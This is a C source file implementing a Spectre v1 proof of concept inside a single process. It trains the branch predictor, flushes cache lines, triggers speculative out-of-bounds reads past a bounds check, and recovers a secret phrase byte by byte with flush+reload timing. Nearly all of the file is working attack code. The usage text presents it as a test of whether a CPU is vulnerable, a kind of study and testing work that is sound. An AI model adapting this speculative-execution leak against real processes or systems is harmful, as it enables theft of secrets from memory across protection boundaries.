// This program implements the Spectre v1 attack where the attacker and victim
// exist in the same user process.
//
//      Connor Shugg

// Imports
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <libsca.h>

// Globals
static int cache_threshold = 80;    // cache access time
static int seed = 0;                // random seed
static int trials = 1000;           // trials per byte

// Victim/attacker shared buffer
#define MEM_BLOCK_SIZE 4096
#define MEM_BLOCK_COUNT 256
static uint8_t mem[MEM_BLOCK_COUNT * MEM_BLOCK_SIZE];

// Victim-only test buffer
#define TESTBUFF_SIZE 16
static char testbuff[TESTBUFF_SIZE];
static int testbuff_len = 16;

// Victim-only secret buffer
#define SECRET_SIZE 128
static char secret[SECRET_SIZE];
static int secret_len = 0;

// Randomly-chosen victim secret messages
#define MESSAGES_SIZE 8
static const char* messages[MESSAGES_SIZE] = {
    "All that is gold does not glitter.",
    "Not all those who wander are lost.",
    "The old that is strong does not wither.",
    "Deep roots are not reached by the frost.",
    "From the ashes a fire shall be woken.",
    "A light from the shadows shall spring.",
    "Renewed shall be blade that was broken.",
    "The crownless again shall be king."
};


// ============================== Victim Code =============================== //
// Initializes the victim's secret buffer.
static void victim_init()
{
    // select a random message to be the secret and copy it into the victim's
    // secret buffer
    int choice = sca_rand_int(0, MESSAGES_SIZE);
    secret_len = snprintf(secret, SECRET_SIZE, "%s", messages[choice]);
    printf("Victim Secret: %s\n", secret);

    // fill up the temporary buffer with random junk
    for (int i = 0; i < TESTBUFF_SIZE; i++)
    { testbuff[i] = (char) sca_rand_int(0, 64); }
    testbuff_len = TESTBUFF_SIZE;
}

// Performs the victim's bounds check on the untrusted, attacker-controlled
// index. Returns zero or non-zero.
// The trick with inducing speculative execution is to delay the resolution of
// the branch for as long as possible. A good way to do this is to make the
// bounds check (i.e. the if-statement in 'victim_access()') dependent on an
// expensive operation. 
// The GCC pragma allows us to tell GCC *not* to optimize this function.
#pragma GCC push_options
#pragma GCC optimize("O0")
static inline int victim_bounds_check(int index)
{
    return index >= 0 && index < testbuff_len;
}
#pragma GCC pop_options

// Represents the victim's behavior. The victim performs a bounds check on a
// given index to ensure it allows a valid access. If the check passes, it makes
// a memory access into a temporary buffer (unreachable by the attacker) to load
// a single byte.
// Then, the victim makes a *second* memory access using a byte from the first
// load as an index into another buffer. If an attacker can force the CPU to
// enter speculative execution at the bounds check with a specially-crafted
// index, the CPU may execute the load before the branch condition resolves.
// This will leave a footprint in the CPU caches, and the attacker will be able
// to detect the footprint. Because the cache line from the shared buffer used
// the secret byte as part of its index, the attacker could infer the secret
// byte with a flush+reload attack.
static uint8_t victim_access(int index)
{
    // perform a bounds check to ensure the given index is within the proper
    // bounds (depending on the CPU branch predictor's state, this may trigger
    // speculative execution of the two loads within!)
    if (victim_bounds_check(index))
    {
        char byte = testbuff[index];
        uint8_t tmp = mem[MEM_BLOCK_SIZE * byte];
        return MAX(1, tmp); // return positive to indicate success
    }
    return 0; // return negative to indicate failure
}


// ============================= Attacker Code ============================== //
// Flushes all cache lines from 'mem' (the shared buffer).
static void attacker_flush()
{
    for (int i = 0; i < MEM_BLOCK_COUNT; i++)
    { sca_flush_write(mem + (i * MEM_BLOCK_SIZE), 0xff); }
}

// Reloads all cache lines from 'mem' (the shared memory region between) and
// determines which ones were present in the CPU cache based on access time.
static void attacker_reload(sca_dataset_t* ds)
{
    for (int i = 0; i < MEM_BLOCK_COUNT; i++)
    {
        // compute the correct address and time the load
        void* addr = mem + (i * MEM_BLOCK_SIZE);
        uint64_t cycles = sca_load(addr, NULL);

        // add to the sca_dataset if the address was cached
        int was_cached = cycles <= cache_threshold;
        if (was_cached)
        { sca_dataset_add(ds, (int64_t) i); }
    }
}

// Attempts to steal a single byte of memory from the victim's secret buffer.
static uint8_t attacker_steal_byte(int secret_index)
{
    // first, compute an address offset to the correct byte of the secret
    int64_t secret_offset = ((int64_t) secret - (int64_t) testbuff);

    // STEP 1. Train the CPU's branch predictor to expect the bounds check
    // within 'victim_access()' to pass
    for (int i = 0; i < secret_len; i++)
    { victim_access(i); }

    // STEP 2. Flush all cache lines relevant to the shared buffer, and flush
    // the 'testbuff_len' variable used in the bounds check. (Flushing this will
    // give us a bigger speculation window)
    attacker_flush();
    sca_flush_write(&testbuff_len, 0xff);

    // STEP 3. Call the victim's code (hoping speculative execution executes)
    victim_access((int) secret_offset + secret_index);

    // STEP 4. Reload all cache lines, saving those whose load time fall under
    // the cache hit threshold
    sca_dataset_t lines;
    sca_dataset_init(&lines, MEM_BLOCK_COUNT);
    attacker_reload(&lines);
    
    // STEP 5. Theoretically, there should only be one valid cache line - the
    // one whose address leaks the secret byte during speculative execution.
    // Capture it here (try to avoid zero)
    uint8_t result = 0;
    if (lines.size > 0)
    { result = (uint8_t) sca_dataset_max(&lines); }
    sca_dataset_free(&lines);
    return result;
}


// ========================== Command-Line Options ========================== //
// Parses command-line arguments and updates globals accordingly.
static void args_parse(int argc, char** argv)
{
    // set up command-line options
    static struct option opts[] = {
        {"help",        no_argument,        NULL,   0},
        {"threshold",   required_argument,  NULL,   0},
        {"seed",        required_argument,  NULL,   0},
        {"trials",      required_argument,  NULL,   0},
        {NULL, 0, NULL, 0}
    };
    int optidx = 0;

    // loop forever until all options are parsed
    while (1)
    {
        // parse the next option and quit on error
        int result = getopt_long_only(argc, argv, "", opts, &optidx);
        if (result == -1)
        { break; }
        if (result != 0)
        { goto args_parse_usage; }

        struct option* opt = &opts[optidx];
        if (!strcmp(opt->name, "help"))
        { goto args_parse_usage; }
        else if (!strcmp(opt->name, "threshold"))
        {
            int result = LF(str_to_int)(optarg, &cache_threshold);
            if (result || cache_threshold <= 0)
            {
                fprintf(stderr, "You must specify a positive, non-zero integer for --threshold.");
                exit(EXIT_FAILURE);
            }
        }
        else if (!strcmp(opt->name, "seed"))
        {
            int result = LF(str_to_int)(optarg, &seed);
            if (result)
            {
                fprintf(stderr, "You must specify an integer for --seed.");
                exit(EXIT_FAILURE);
            }
        }
        else if (!strcmp(opt->name, "trials"))
        {
            int result = LF(str_to_int)(optarg, &trials);
            if (result || trials <= 0)
            {
                fprintf(stderr, "You must specify a positive, non-zero integer for --trials.");
                exit(EXIT_FAILURE);
            }
        }
    }
    return;
    
    // prints out a usage menu and exits the program
    args_parse_usage:
    printf("Spectre v1 Attack Test");
    printf("Usage: %s [OPTIONS]\n", argv[0]);
    printf("Use this to verify that your CPU is vulnerable to the Spectre v1 attack.\n"
           "This tool performs a same-address-space Spectre v1 attack and attempts to guess a secret phrase.\n\n");

    printf("Options:\n");
    struct option* o = &opts[0];
    while (o->name)
    {
        printf("  --%s (-%c)\n", o->name, o->name[0]);
        o++;
    }
    exit(0);
}

// ================================== Main ================================== //
// Main function.
int main(int argc, char** argv)
{
    // parse command-line arguments
    seed = time(NULL);
    args_parse(argc, argv);
    sca_rand_seed(seed);
    
    victim_init();
    
    // ------------------------------- Attack ------------------------------- //
    // begin the attack! for each byte in the secret, we'll perform multiple
    // trials
    char leaked[secret_len];
    sca_countset_t counts;
    sca_countset_init(&counts, MEM_BLOCK_COUNT);
    printf("Attack Leaked: ");
    for (int b = 0; b < secret_len; b++)
    {
        for (int i = 0; i < trials; i++)
        {
            int64_t byte = (int64_t) attacker_steal_byte(b);
            if (byte != 0)
            { sca_countset_add(&counts, byte); }
        }

        // find the highest-occurring discovered byte and print it
        sca_countset_elem_t* winner = sca_countset_highest(&counts);
        if (winner)
        {
            // record the byte for later analysis
            leaked[b] = (char) winner->value;
            
            // print the resulting character
            int byte_is_visible = winner->value >= 32 && winner->value <= 126;
            printf("%c", byte_is_visible ? (char) winner->value : '.');
            fflush(stdout);
        }
        else
        {
            printf(".");
            fflush(stdout);
        }

        // reset the sca_countset to reuse for the next secret byte
        sca_countset_reset(&counts);
    }
    printf("\n");
    sca_countset_free(&counts);

    // ------------------------------ Analysis ------------------------------ //
    // compare the victim's secret to the attacker's and determine how many
    // characters were matched
    int matched = 0;
    for (int b = 0; b < secret_len; b++)
    { matched += leaked[b] == secret[b]; }

    // compute a match rate and print a final summary
    float match_rate = (float) matched / (float) secret_len;
    printf("Leaked %d/%d secret bytes (%.2f%%).\n",
           matched, secret_len, match_rate * 100.0);
}

